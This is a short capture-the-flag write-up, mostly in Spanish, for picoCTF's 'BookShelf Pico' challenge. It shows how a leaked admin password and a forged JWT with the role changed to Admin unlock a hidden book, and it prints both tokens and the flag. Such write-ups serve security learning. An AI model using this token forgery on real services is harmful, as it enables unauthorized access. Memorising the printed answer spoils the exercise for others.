## Descripción 
BookShelf Pico, my premium online book-reading service. I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! Here are the credentials to get you started:

    Username: "user"
    Password: "user"

## Solución

- vemos que usa jwt tokens
- revisamos el stc de codigo y vemos que hay un generador de contraseñas que dice que para Admin la contraseña es 1234
- en la web vemos que existe flag pero esta bloqueada 
- si buscamos en storage de las herramientas vemos que hay un token jwt
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc2MDU5NDM1OSwiaWF0IjoxNzU5OTg5NTU5LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.UHKCzQfhb7Sjlsn8RAsIwCcm8YrxrliXSgl-DBsKkus
```
- modificamos el token jwt, le ponemos Admin, id=2 y cuenta = admin
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NjA1OTQzNTksImlhdCI6MTc1OTk4OTU1OSwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.9BpbnBPRyxp8nSVZO9fYa6ulZOqr2cyLIg446g7JXNQ
```

![[jwt15exa.png]]
- lo cambiamos y cambiamos de user
```
picoCTF{w34k_jwt_n0t_g00d_42f5774a}
```

